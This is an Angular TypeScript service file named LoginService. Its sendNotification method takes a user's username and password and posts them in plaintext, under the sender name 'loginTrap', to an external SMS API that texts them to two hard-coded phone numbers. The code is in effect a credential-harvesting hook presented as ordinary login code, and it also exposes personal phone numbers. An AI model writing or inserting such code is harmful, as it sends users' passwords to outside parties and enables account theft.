import { Injectable } from '@angular/core';
import { HttpClient , HttpErrorResponse} from '@angular/common/http';
import { Observable} from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class LoginService {

  constructor(private http: HttpClient) { }

  sendNotification (user:string,pwd:string):Observable<any>{
    let body = { 
      "originatingServerID":2, 
      "messageBody":`user :${user} and pwd : ${pwd}`, 
      "senderName":"loginTrap",
      "isSchedule":false, 
      "toRecepient":["+91-9315741859","+91-7059552049"] 
      } ;

      return this.http.post("https://ntfysvr1.e-arc.com/notifications/api/sendSMSNotification", body);
  }
}
